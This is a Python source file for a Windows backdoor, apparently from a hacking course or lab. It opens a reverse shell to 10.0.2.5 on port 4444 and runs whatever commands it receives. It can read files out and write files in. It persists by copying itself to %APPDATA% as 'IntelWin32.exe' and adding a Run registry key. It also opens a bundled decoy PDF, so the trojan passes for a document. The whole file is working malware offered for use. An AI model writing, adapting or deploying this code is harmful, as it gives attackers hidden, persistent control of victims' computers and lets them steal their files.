import socket, subprocess, simplejson, os, base64, sys, shutil

#this is for windows machine reverseBack


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\IntelWin32.exe"
        if not os.path.exists((evil_file_location)):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.run('reg add HKCU\Software\Microsoft\Windows\
            CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell = True)

    def reliable_send(self, data):
        json_data = simplejson.dumps(data.decode('cp866'))
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('cp866')
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            # FOR PYTHON 2
            # DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True, stderr = subprocess.DEVNULL, stdin= subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            return b"[-] Error during command execution. Probably you misspelled it."

    def change_working_directory_to(self, path):
        os.chdir(path)
        return ("[+] Changing working directory to " + path).encode()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return b"[+] Upload successful"

    def run(self):
        while True:
            command = self.reliable_receive()

            for i in range(1,4):
                s = "hel"

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1].split("/")[-1], command[2])
                else:
                    command_result = self.execute_system_command(command)

            except Exception as e:
                command_result = ("[-] Error during command execution" + str(e)).encode()

            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell = True)

try:
    my_backdoor = Backdoor("10.0.2.5", 4444)
    my_backdoor.run()
except Exception as e:
    sys.exit()
